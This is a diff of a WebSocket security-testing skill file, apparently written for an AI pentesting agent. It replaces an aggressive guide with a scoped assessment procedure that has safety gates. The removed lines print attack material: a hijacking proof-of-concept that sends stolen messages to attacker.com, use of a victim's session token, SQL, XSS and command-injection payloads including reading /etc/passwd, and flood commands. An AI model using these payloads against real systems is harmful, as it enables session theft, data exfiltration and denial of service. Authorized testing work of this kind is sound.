@@ -1,136 +1,69 @@
 ---
 name: attack-websocket
-description: "WebSocket security testing — CSWSH, message injection, auth bypass, origin validation"
+description: "Assess WebSocket origin checks, authentication lifecycle, message authorization, and input handling"
 category: "web-application"
-version: "1.0"
-author: "cyberstrike-official"
-tags:
-  - websocket
-  - web
-  - cswsh
-  - injection
-  - attack
-tech_stack:
-  - web
-cwe_ids:
-  - CWE-1385
-  - CWE-346
-chains_with:
-  - attack-cors
-prerequisites: []
-severity_boost:
-  attack-cors: "WebSocket + CORS bypass = cross-origin data theft via WS"
+version: "1.1.0"
+author: "CyberStrike contributors; consolidated with upstream attribution"
+tags: [websocket, cswsh, origin, authorization, messages]
+tech_stack: [http, websocket, browser, json]
+cwe_ids: [CWE-346, CWE-284]
+chains_with: [attack-idor-automation, attack-csrf, attack-triage-validation]
+prerequisites:
+  - "Authorized WebSocket endpoint and controlled account"
+  - "Permission for message-level tests and low-volume connection checks"
+sources:
+  - "https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-websocket/SKILL.md"
+  - "https://github.com/uphiago/recon-skills"
 ---
 
-# WebSocket Security Testing
+# WebSocket Security Assessment
 
 ## Objective
 
-Exploit WebSocket implementation flaws including cross-site WebSocket hijacking (CSWSH), message injection, and authentication bypass.
+Determine whether a WebSocket connection enforces expected origin, authentication, authorization, message validation, and session-lifecycle controls after the HTTP upgrade.
 
-## Testing Methodology
+## Safety gates
 
-### Phase 1: Identify WebSocket Endpoints
+Use only an in-scope endpoint and a controlled test account. Do not flood connections, send destructive messages, access other users' private channels, or replay another user's session. Keep message volume low and stop on service instability.
 
-```bash
-# Look for WebSocket upgrade
-curl -s -D- https://TARGET/ -H "Upgrade: websocket" -H "Connection: Upgrade"
+## Procedure
 
-# Check common paths
-for path in /ws /socket /websocket /api/ws /chat /live /realtime; do
-  curl -s -D- "https://TARGET$path" \
-    -H "Upgrade: websocket" \
-    -H "Connection: Upgrade" \
-    -H "Sec-WebSocket-Version: 13" \
-    -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" 2>/dev/null | head -1
-done
-```
+### 1. Discover and baseline
 
-### Phase 2: Cross-Site WebSocket Hijacking (CSWSH)
+Identify the WebSocket URL, subprotocol, upgrade headers, authentication mechanism, origin behavior, and expected message schema from authorized application traffic or documentation. Record a normal connection and a harmless read-only message.
 
-Check if Origin header is validated:
+### 2. Test origin validation
 
-```bash
-# Connect with evil origin
-websocat -H "Origin: https://evil.com" "wss://TARGET/ws"
+Compare the legitimate application origin with a controlled untrusted origin. Where relevant, test absent or `null` origin behavior without involving real users. Origin rejection must be evaluated with cookie-based authentication context; a permissive origin alone is not enough to prove CSWSH.
 
-# If connection succeeds with evil.com origin → CSWSH is possible
-```
+### 3. Test authentication lifecycle
 
-**PoC HTML:**
-```html
-<script>
-var ws = new WebSocket('wss://TARGET/ws');
-ws.onmessage = function(e) {
-  fetch('https://attacker.com/log?data=' + btoa(e.data));
-};
-ws.onopen = function() {
-  ws.send(JSON.stringify({action: 'get_profile'}));
-};
-</script>
-```
+Compare controlled authenticated and unauthenticated connection attempts. Check whether expired/revoked sessions are rejected, whether logout invalidates an existing connection, and whether reauthentication is required after sensitive account changes. Never use another user's cookies or tokens.
 
-### Phase 3: Authentication Testing
+### 4. Test message-level authorization
 
-```bash
-# Connect without auth token
-websocat "wss://TARGET/ws"
+With two test accounts if permitted, compare access to a channel or object each account owns. Change one object/channel identifier at a time and verify semantic data access or state changes. Check authorization for every message/action, not only during the initial handshake.
 
-# Test token reuse after logout
-websocat -H "Cookie: session=EXPIRED_TOKEN" "wss://TARGET/ws"
+### 5. Validate input and protocol handling
 
-# Connect with another user's token
-websocat -H "Cookie: session=VICTIM_TOKEN" "wss://TARGET/ws"
-```
+Use schema-valid harmless edge cases and small malformed messages to check server-side validation, type handling, and error behavior. Avoid oversized frames, rapid reconnect loops, or resource-exhaustion payloads. Record whether errors leak implementation details.
 
-### Phase 4: Message Injection
+### 6. Assess CSWSH and cross-origin risk
 
-```bash
-# Test for SQL injection via WebSocket message
-websocat "wss://TARGET/ws" <<< '{"action":"search","query":"test\" OR 1=1--"}'
+If browser cookies authenticate the socket and untrusted origins are accepted, validate only with a local proof page and a controlled test account. Prove access to a harmless test-only message. Do not read another user's private messages or send a proof to real users.
 
-# XSS via WebSocket message (if rendered in other clients)
-websocat "wss://TARGET/ws" <<< '{"action":"chat","message":"<img src=x onerror=alert(1)>"}'
+### 7. Confirm impact and cleanup
 
-# Command injection
-websocat "wss://TARGET/ws" <<< '{"action":"exec","cmd":"id; cat /etc/passwd"}'
-```
+Capture handshake metadata, origin, auth context, message schema, expected policy, and observed result. Close test connections and remove test data where permitted.
 
-### Phase 5: Rate Limiting / DoS
+## Common false positives
 
-```bash
-# Rapid message sending
-for i in $(seq 1 1000); do
-  echo '{"action":"ping"}'
-done | websocat "wss://TARGET/ws"
+- A WebSocket endpoint is publicly connectable but exposes only public data.
+- Origin is permissive but authentication is token-based and not ambient.
+- The handshake is authorized but each message is correctly checked.
+- A malformed message returns an error without a security impact.
+- A successful connection is misreported as authentication bypass.
 
-# Large message
-python3 -c "print('{\"data\":\"' + 'A'*1000000 + '\"}')" | websocat "wss://TARGET/ws"
-```
+## Output contract
 
-## What Constitutes a Finding
-
-| Finding | Severity |
-|---------|----------|
-| CSWSH — cross-site WebSocket hijacking | High (P2) |
-| No authentication on WebSocket | High (P2) |
-| SQL/command injection via WS message | Critical (P1) |
-| Stored XSS via WS message | High (P2) |
-| Session not invalidated after logout | Medium (P3) |
-
-## Evidence Requirements
-
-- WebSocket endpoint URL
-- Connection with evil Origin (for CSWSH)
-- Messages sent and received
-- Proof of unauthorized data access or injection
-
-## Tools
-
-- `websocat` (external) — WebSocket CLI client
-- Browser DevTools → Network → WS tab
-
-## References
-
-- [PortSwigger: WebSocket Vulnerabilities](https://portswigger.net/web-security/websockets)
-- [OWASP: WebSocket Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets)
+Return `endpoint`, `origin_policy`, `auth_mechanism`, `session_lifecycle`, `message_action`, `object_boundary`, `observed_effect`, `cleanup_status`, `impact`, `confidence`, and redacted evidence.
